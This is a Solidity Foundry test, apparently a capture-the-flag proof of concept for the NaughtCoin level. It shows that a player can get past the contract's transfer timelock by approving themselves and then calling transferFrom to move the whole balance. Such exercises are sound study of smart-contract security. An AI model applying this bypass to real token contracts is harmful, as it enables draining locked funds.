// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "src/level15.sol";

contract POC is Test {
    NaughtCoin level15;
    address bob;

    function setUp() public {
        bob = makeAddr("bob");
        level15 = new NaughtCoin(bob);
    }

    function test() public {
        vm.startPrank(bob);
        level15.player();
        level15.decimals();
        level15.approve(bob, 1000000000000000000000000);
        level15.balanceOf(bob);
        level15.transferFrom(bob, address(1), 1000000000000000000000000);
        level15.balanceOf(bob);
        vm.stopPrank();
    }
}
